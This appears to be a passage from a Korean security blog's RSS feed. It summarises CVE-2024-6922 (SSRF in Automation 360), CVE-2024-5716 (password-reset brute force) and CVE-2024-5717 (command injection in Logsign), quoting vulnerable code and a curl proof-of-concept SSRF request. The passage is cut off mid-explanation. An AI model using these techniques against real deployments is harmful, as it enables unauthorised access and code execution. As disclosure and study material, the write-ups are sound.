&#xC2E0;&#xACE0;&#xD3EC;&#xC0C1;&#xC81C; (&#xBC84;&#xADF8;&#xBC14;&#xC6B4;&#xD2F0;)</a> | &#xAE08;&#xC735;&#xBCF4;&#xC548;&#xC6D0; | ~24.08.31</p><p><a href="https://iscr.cyber.go.kr/">&#xAD6D;&#xC81C; &#xC0AC;&#xC774;&#xBC84;&#xBC94;&#xC8C4;&#xB300;&#xC751; &#xC2EC;&#xD3EC;&#xC9C0;&#xC5C4;</a> | &#xACBD;&#xCC30;&#xCCAD; | 24.07.01 &#xC0AC;&#xC804; &#xB4F1;&#xB85D; &#xC2DC;&#xC791; (24.08.27 ~ 24.08.29)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Newsletter/">Newsletter</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hunjison/">hunjison</category>
      
      <category domain="https://hackyboiz.github.io/tags/newsletter/">newsletter</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/29/hunjison/newsletter0729/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-6922: Automation 360의 SSRF 취약점</title>
      <link>https://hackyboiz.github.io/2024/07/27/l0ch/2024-07-27/</link>
      <guid>https://hackyboiz.github.io/2024/07/27/l0ch/2024-07-27/</guid>
      <pubDate>Sat, 27 Jul 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.rapid7.com/blog/post/2024/07/26/cve-2024-6922</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.rapid7.com/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/">https://www.rapid7.com/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Automation 360 Robotic Processs Automation suite v21 ~ v32</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Automation 360&#xC740; Control Room &#xC11C;&#xBC84;&#xB85C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC5D0;&#xC774;&#xC804;&#xD2B8;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xAC70;&#xB098; &#xC790;&#xB3D9;&#xD654;&#xB41C; &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC911;&#xC559;&#xC9D1;&#xC911;&#xD615; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD55C; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; Automation 360&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC811;&#xADFC;&#xC774; &#xC81C;&#xD55C;&#xB41C; API, &#xB85C;&#xCEEC; &#xC11C;&#xBE44;&#xC2A4; &#xB4F1;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; SSRF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xACE0;, &#xAD00;&#xB828; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros">&lt;!--<span class="hljs-built_in"> proxy </span>--&gt;&lt;sec:intercept-url <span class="hljs-attribute">pattern</span>=<span class="hljs-string">&quot;/v1/proxy/test&quot;</span> <span class="hljs-attribute">access</span>=<span class="hljs-string">&quot;permitAll()&quot;</span>/&gt;</code></pre><p><code>kernel.jar</code> &#xB0B4; <code>spring/authn-context-global-security-urls.xml</code> &#xD30C;&#xC77C;&#xC5D0;&#xB294; URL &#xD328;&#xD134; <code>/v1/proxy/test</code> &#xC774; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBAA8;&#xB4E0; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; API &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB294; <code>testSDSProxyCredentials</code> &#xD568;&#xC218;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">testSDSProxyCredentials</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">final</span> SDSProxyCredTestRequest proxyCredsToTest)</span> </span>{  <span class="hljs-keyword">if</span> (proxyCredsToTest.getSaasUrl().isEmpty()) {    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(        <span class="hljs-string">&quot;Please provide a valid SaaS system url.&quot;</span>);  }  <span class="hljs-comment">// escape with # character</span>  <span class="hljs-keyword">final</span> String saasUrl = String.format(      <span class="hljs-string">&quot;https://%s/v1/authentication&quot;</span>, proxyCredsToTest.getSaasUrl());   HttpURLConnection httpURLConnection = <span class="hljs-keyword">null</span>;  <span class="hljs-keyword">final</span> String proxyUsername = proxyCredsToTest.getUsername();  <span class="hljs-keyword">final</span> String proxyPassword = proxyCredsToTest.getPassword();  <span class="hljs-keyword">final</span> <span class="hljs-keyword">boolean</span> proxyCredsPassed = !proxyUsername.isEmpty();  String CLOUD_CR_CONNECTION_FAILED =      <span class="hljs-string">&quot;Unable to connect to cloud control room.&quot;</span>;  <span class="hljs-keyword">try</span> {    <span class="hljs-keyword">try</span> {      httpURLConnection = ProxyUtil.getConnection(saasUrl);      httpURLConnection.setDoOutput(<span class="hljs-keyword">true</span>);      httpURLConnection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);      httpURLConnection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);    } <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> Exception e) {      <span class="hljs-keyword">this</span>.proxyAuditService.addAuditLog(          ProxyAuditValue.PROXY_CONNECTIVITY_TEST_FAILURE,          CLOUD_CR_CONNECTION_FAILED);      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);    }    <span class="hljs-keyword">if</span> (proxyCredsPassed) {      ProxyUtil.setAuthenticator(          saasUrl, httpURLConnection, proxyUsername, proxyPassword);    }    <span class="hljs-keyword">try</span> {      <span class="hljs-keyword">final</span> DataOutputStream wr =          <span class="hljs-keyword">new</span> DataOutputStream(httpURLConnection.getOutputStream()); <span class="hljs-comment">// [3]</span><span class="hljs-comment">//...</span></code></pre><p>&#xD568;&#xC218;&#xB294; POST &#xC694;&#xCCAD; &#xBCF8;&#xBB38; &#xC911; SaaS &#xC2DC;&#xC2A4;&#xD15C; URL&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; JSON &#xD615;&#xC2DD;&#xC758; <code>saasUrl</code> &#xAC12;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>saasUrl</code>&#xC5D0; <code>/v1/authentication</code> &#xACBD;&#xB85C;&#xB97C; &#xBD99;&#xC5EC; &#xD574;&#xB2F9; URL&#xC5D0; POST &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; authentication proxy&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; saasUrl &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; <code>#</code> &#xBB38;&#xC790;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; <code>#</code> &#xB4A4;&#xC5D0; &#xBD99;&#xB294; <code>/v1/authentication</code> &#xACBD;&#xB85C;&#xAC00; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504;&#xB418;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; &#xD638;&#xC2A4;&#xD2B8; &#xBC0F; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -vvv &apos;http://<span class="hljs-number">192.166.15.138</span>/v<span class="hljs-number">1</span>/proxy/test&apos; -d &apos;{<span class="hljs-string">&quot;saasUrl&quot;</span>:<span class="hljs-string">&quot;www.[Internal_API_Path]?param1=1...#&quot;</span>}&apos;</code></pre><p>&#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC678;&#xBD80; &#xC811;&#xADFC;&#xC774; &#xD5C8;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC31;&#xC5D4;&#xB4DC; API &#xD639;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xB4F1;&#xC5D0; &#xC784;&#xC758;&#xC758; POST &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ssrf/">ssrf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/automation-360/">automation 360</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/27/l0ch/2024-07-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-5716: Logsign 사의 Unified SecOps Platform에서 발견된 두 가지 취약점</title>
      <link>https://hackyboiz.github.io/2024/07/24/ogu123/cve-2024-5716/</link>
      <guid>https://hackyboiz.github.io/2024/07/24/ogu123/cve-2024-5716/</guid>
      <pubDate>Wed, 24 Jul 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2024/7/1/getting-u</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform">https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Logsign Unified SecOps Platform &lt; 6.4.8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Logsign Unified SecOps Platform&#xC740; &#xAE30;&#xC5C5; &#xBCF4;&#xC548; &#xC6B4;&#xC601;&#xC744; &#xC704;&#xD55C; &#xD1B5;&#xD569; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. Python &#xAE30;&#xBC18;&#xC758; &#xC6F9; &#xC11C;&#xBC84;&#xB85C;, &#xC0AC;&#xC6A9;&#xC790;&#xB294; API&#xB97C; &#xD1B5;&#xD574; &#xC6F9; &#xC11C;&#xBC84;&#xC640; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Unified SecOps Platform&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACB0;&#xD569;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xBC0F; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2024-5716-Authentication-Bypass"><a href="#CVE-2024-5716-Authentication-Bypass" class="headerlink" title="CVE-2024-5716 - Authentication Bypass"></a>CVE-2024-5716 - Authentication Bypass</h3><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xC694;&#xCCAD;&#xC744; &#xBC1B;&#xC73C;&#xBA74; &#xD574;&#xB2F9; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C;&#xB85C; 6&#xC790;&#xB9AC; &#xC22B;&#xC790;&#xB85C; &#xAD6C;&#xC131;&#xB41C; reset_code&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xB294; reset_code&#xB97C; &#xD1B5;&#xD574; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, reset_code &#xAC80;&#xC99D;&#xC5D0; &#xB300;&#xD55C; &#xD69F;&#xC218; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xB294; bruteforce &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">@flask_app.route(&apos;/settings/forgot_password&apos;, methods=[&apos;POST&apos;])</span><span class="hljs-meta">@decs.json_api</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forgot_password</span>():</span>    <span class="hljs-keyword">try</span>:        data = json.loads(request.data)        username = data.get(<span class="hljs-string">&apos;username&apos;</span>, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># [1]</span>        user_conf = user_store.fetch_by_username(username)        _now = datetime.datetime.now().strftime(<span class="hljs-string">&apos;%Y-%m-%d %H:%M:%S&apos;</span>)        <span class="hljs-keyword">if</span> user_conf <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> user_conf.get(<span class="hljs-string">&apos;disabled&apos;</span>):            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_conf.get(<span class="hljs-string">&apos;from_ldap&apos;</span>):  <span class="hljs-comment"># [2]</span>                reset_code = random_int(<span class="hljs-number">6</span>)                user_store.save(user_conf.get(<span class="hljs-string">&apos;uid&apos;</span>), {<span class="hljs-string">&quot;reset_code&quot;</span>: reset_code, <span class="hljs-string">&quot;reset_time&quot;</span>: time.time(), <span class="hljs-string">&quot;reset_datetime&quot;</span>: _now})                subject = <span class="hljs-string">&quot;Logsign - Your single-use code&quot;</span>                content = <span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">                    We received your request for a single-use code to use with your Logsign account.\n</span><span class="hljs-string">                    Your single-use code is: &lt;b&gt;%s&lt;/b&gt;\n</span><span class="hljs-string">                    If you didn&apos;t request this code, you can safely ignore this email.\n</span><span class="hljs-string">                &apos;&apos;&apos;</span> % reset_code            <span class="hljs-keyword">else</span>:                subject = <span class="hljs-string">&quot;Logsign - LDAP User Forgot Password&quot;</span>                content = <span class="hljs-string">&apos;&apos;&apos;</span><span class="hljs-string">                    We are writing to inform you that the user account associated with %s is under the ownership and management of your LDAP server.\n</span><span class="hljs-string">                    As such, we would like to emphasize that no updates or changes can be made to this account from Logsign.\n\n</span><span class="hljs-string">                    Any actions related to this account should be directed to your designated LDAP administrators. </span><span class="hljs-string">                &apos;&apos;&apos;</span> % username            <span class="hljs-keyword">for</span> response_conf <span class="hljs-keyword">in</span> _get_default_notification_config():                action_obj = {                    <span class="hljs-string">&apos;uid&apos;</span>: random_string(<span class="hljs-number">16</span>),                    <span class="hljs-string">&apos;datetime&apos;</span>: _now,                    <span class="hljs-string">&apos;response_uid&apos;</span>: response_conf.get(<span class="hljs-string">&apos;uid&apos;</span>),                    <span class="hljs-string">&apos;integration&apos;</span>: response_conf.get(<span class="hljs-string">&apos;integration&apos;</span>),                    <span class="hljs-string">&apos;method&apos;</span>: <span class="hljs-string">&apos;send&apos;</span>,                    <span class="hljs-string">&apos;is_mss&apos;</span>: <span class="hljs-literal">False</span>,                    <span class="hljs-string">&apos;args&apos;</span>: {                        <span class="hljs-string">&apos;content&apos;</span>: content,                        <span class="hljs-string">&apos;subject&apos;</span>: subject,                        <span class="hljs-string">&apos;to_users&apos;</span>: [{<span class="hljs-string">&apos;user_uid&apos;</span>: user_conf.get(<span class="hljs-string">&apos;uid&apos;</span>), <span class="hljs-string">&apos;is_local&apos;</span>: <span class="hljs-literal">True</span>}]                    }                }                redis_client.hset(<span class="hljs-string">&apos;action_queue&apos;</span>, action_obj.get(<span class="hljs-string">&apos;uid&apos;</span>), json.dumps(action_obj))    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:        <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Reset password failed: %s&apos;</span> % str(err), <span class="hljs-string">&apos;success&apos;</span>: <span class="hljs-literal">False</span>}    <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;If that username is in our database, we will send you an email to reset your password&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: <span class="hljs-literal">True</span>}</code></pre><p>[1] POST &#xC694;&#xCCAD;&#xC5D0;&#xC11C; <code>username</code>&#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. [2] &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>from_ldap</code>&#xC544;&#xB2CC; &#xACBD;&#xC6B0;, <code>reset_code</code>&#xB97C; 6&#xC790;&#xB9AC; &#xB79C;&#xB364; &#xC22B;&#xC790;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sas">def random<span class="hljs-meta">_int(</span>N):    <span class="hljs-meta">return</span> <span class="hljs-string">&quot;&quot;</span>.jo<span class="hljs-meta">in(</span>(str(random.ran<span class="hljs-meta">dint(</span>0, 9)) for <span class="hljs-meta">x</span> <span class="hljs-meta">in</span><span class="hljs-meta"> range(</span>N)))</code></pre><p>&#xC11C;&#xBC84;&#xB294; <code>username</code>&#xACFC; <code>reset_code</code> &#xC30D;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC774;&#xBA54;&#xC77C;&#xB85C; <code>reset_code</code>&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs kotlin"><span class="hljs-meta">@flask_app</span>.route(<span class="hljs-string">&apos;/settings/verify_reset_code&apos;</span>, methods=[<span class="hljs-string">&apos;POST&apos;</span>])<span class="hljs-meta">@decs</span>.json_apidef verify_reset_code():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">data</span> = json.loads(request.<span class="hljs-keyword">data</span>)        <span class="hljs-keyword">if</span> not <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;reset_code&apos;</span>):            <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Failed&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: False}        username = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;username&apos;</span>, None)        <span class="hljs-keyword">if</span> not username:            <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Failed&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: False}        user_conf = user_store.fetch_by_username(username)        <span class="hljs-keyword">if</span> not user_conf or user_conf.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;disabled&apos;</span>):            <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Failed&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: False}        <span class="hljs-keyword">if</span> time.time() - user_conf.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;reset_time&apos;</span>, <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">180</span>:  # [<span class="hljs-number">1</span>]            <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Password reset timeout&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: False}        <span class="hljs-keyword">if</span> str(<span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;reset_code&apos;</span>, <span class="hljs-string">&apos;&apos;</span>)) == user_conf.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;reset_code&apos;</span>):            verification_code = <span class="hljs-string">&apos;%s-%s-%s&apos;</span> % (random_string(<span class="hljs-number">8</span>), random_string(<span class="hljs-number">8</span>), random_string(<span class="hljs-number">8</span>))            user_store.save(user_conf.<span class="hljs-keyword">get</span>(<span class="hljs-string">&apos;uid&apos;</span>), {<span class="hljs-string">&quot;reset_code&quot;</span>: None, <span class="hljs-string">&quot;reset_time&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;reset_datetime&quot;</span>: <span class="hljs-number">0</span>,                                                   <span class="hljs-string">&quot;reset_verified&quot;</span>: True, <span class="hljs-string">&quot;verify_code_time&quot;</span>: time.time(), <span class="hljs-string">&quot;verification_code&quot;</span>: verification_code})        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Verification code invalid&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: False}    except Exception <span class="hljs-keyword">as</span> err:        <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Verify reset code failed: %s&apos;</span> % str(err), <span class="hljs-string">&apos;success&apos;</span>: False}    <span class="hljs-keyword">return</span> {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;Success&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: True, <span class="hljs-string">&apos;verification_code&apos;</span>: verification_code}</code></pre><p>[1] &#xC11C;&#xBC84;&#xB294;<code>reset_code</code>&#xC758; &#xB9CC;&#xB8CC; &#xC2DC;&#xAC04;&#xC744; 3&#xBD84;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC9C0;&#xB9CC;, &#xAC80;&#xC99D; &#xC2DC;&#xB3C4; &#xD69F;&#xC218; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD574;, &#xACF5;&#xACA9;&#xC790;&#xB294; admin &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xACE0;, 3&#xBD84; &#xB0B4;&#xC5D0; bruteforce &#xACF5;&#xACA9;&#xC73C;&#xB85C; <code>reset_code</code>&#xB97C; &#xCC3E;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D; 3&#xBD84; &#xB0B4;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74;, &#xC0C8;&#xB85C;&#xC6B4; <code>reset_code</code>&#xB97C; &#xC694;&#xCCAD;&#xD574; &#xACF5;&#xACA9;&#xC744; &#xBC18;&#xBCF5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2024-5717-Post-Auth-Command-Injection"><a href="#CVE-2024-5717-Post-Auth-Command-Injection" class="headerlink" title="CVE-2024-5717 - Post Auth Command Injection"></a>CVE-2024-5717 - Post Auth Command Injection</h3><p>&#xB450; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;&#xC744; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, CVE-2024-5716 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC778;&#xC99D; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs prolog"># /opt/logsign-api/settings_api.py@settings_pages.route(<span class="hljs-string">&apos;/demo_mode&apos;</span>, methods=[<span class="hljs-string">&apos;POST&apos;</span>])@decs.check_profile_only_case(<span class="hljs-string">&apos;set_settings_demo_mode&apos;</span>)@decs.json_api[<span class="hljs-number">1</span>] @decs.authenticatedef demo_mode_toggle():    data = json.loads(request.data)    if data.get(<span class="hljs-string">&apos;enable&apos;</span>):        for line in local[<span class="hljs-string">&apos;screen&apos;</span>][<span class="hljs-string">&apos;-ls&apos;</span>](retcode=<span class="hljs-symbol">None</span>).split(<span class="hljs-string">&apos;\n&apos;</span>):            if line.find(<span class="hljs-string">&apos;demo_mode&apos;</span>) != <span class="hljs-number">-1</span>:                return {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;already running&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: <span class="hljs-symbol">False</span>}[<span class="hljs-number">2</span>]        local[<span class="hljs-string">&apos;screen&apos;</span>][<span class="hljs-string">&apos;-dmS&apos;</span>][<span class="hljs-string">&apos;demo_mode&apos;</span>][<span class="hljs-string">&apos;sh&apos;</span>][<span class="hljs-string">&apos;-c&apos;</span>][            <span class="hljs-string">&apos;cd /opt/log_generator; ./start.sh -e &apos;</span> + escapeshellarg(                data.get(<span class="hljs-string">&apos;list&apos;</span>)) + <span class="hljs-string">&apos; -o es -s localhost -p 10 2&gt;&amp;1&apos;</span>]()        config.set(<span class="hljs-string">&apos;demo_mode_scenarios&apos;</span>, data)        config.save()    else:        local[<span class="hljs-string">&apos;screen&apos;</span>][<span class="hljs-string">&apos;-S&apos;</span>][<span class="hljs-string">&apos;demo_mode&apos;</span>][<span class="hljs-string">&apos;-p&apos;</span>][<span class="hljs-string">&apos;0&apos;</span>][<span class="hljs-string">&apos;-X&apos;</span>][<span class="hljs-string">&apos;quit&apos;</span>]()    return {<span class="hljs-string">&apos;message&apos;</span>: <span class="hljs-string">&apos;success&apos;</span>, <span class="hljs-string">&apos;success&apos;</span>: <span class="hljs-symbol">True</span>}</code></pre><p><code>list</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;&#xC744; <code>escapeshellarg</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD55C; &#xD6C4;, &#xC774;&#xB97C; &#xC258; &#xBA85;&#xB839;&#xC5B4;&#xC5D0; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gradle"># <span class="hljs-regexp">/opt/</span>logsign-commons<span class="hljs-regexp">/python/</span>logsign<span class="hljs-regexp">/commons/</span>helpers.pyc<span class="hljs-keyword">def</span> escapeshellarg(s):    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\\&apos;&quot;</span>.<span class="hljs-keyword">join</span>((<span class="hljs-keyword">char</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">char</span> in s.split(<span class="hljs-string">&quot;&apos;&quot;</span>)))</code></pre><p><code>escapeshellarg</code> &#xD568;&#xC218;&#xB294; &#xB2E8;&#xC77C; 